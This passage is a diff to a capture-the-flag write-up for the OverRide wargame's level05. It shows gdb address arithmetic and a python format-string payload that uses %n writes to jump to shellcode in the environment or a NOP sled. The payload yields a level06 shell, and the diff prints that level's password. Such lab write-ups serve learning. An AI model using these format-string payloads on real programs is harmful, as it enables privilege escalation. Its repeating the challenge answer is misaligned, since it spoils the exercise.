@@ -90,7 +90,49 @@ level05@OverRide:~$ (python -c 'print "AAAA" + "BBBB" " %10$p %11$p"') | ./level
 aaaabbbb 0x61616161 0x62626262
 ```
 
- x/s *((char**)environ)
+ ```
+ shellAddr = 0xMsbLsb
+ 
+Lsb - 4 - 4 (already printed 2 addr)
+Msb - Lsb = 0xffff - Lsb
+
+ex
+0xffffdc59
+
+(gdb) p 0xdc59 - 8 = 56401
+(gdb) p 0xffff - 0xdc59 = 9126
+```
+
+```
+
+(gdb)  x *((char**)environ)
+0xffffd647:	0x4c454853
+(gdb) p/x 0xffffd647 + 10
+$1 = 0xffffd651
+
+(gdb) p 0xd651 - 8      = 54857
+(gdb) p 0xffff - 0xd651 = 10670
+
+(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe0"[::-1] + "%54857%10$n%10670%11$n"' ; cat) | ./level05 > /dev/null
+Segmentation fault (core dumped)
+
+(gdb) x/900 $esp
+
+0xffffdd00:	0x90909090	0x90909090	0x90909090	0x90909090
+
+(gdb) p 0xdd00 - 8        = 56568
+(gdb)  p 0xffff - 0xdd00  = 8959
+
+
+level05@OverRide:~$ (python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56568d%10$n%8959d%11$n"' ; cat) | ./level05 > /dev/null
+whoami 1>&2
+level06
+pwd 1>&2
+/home/users/level05
+cat /home/users/level06/.pass 1>&2
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+```
 
 
 
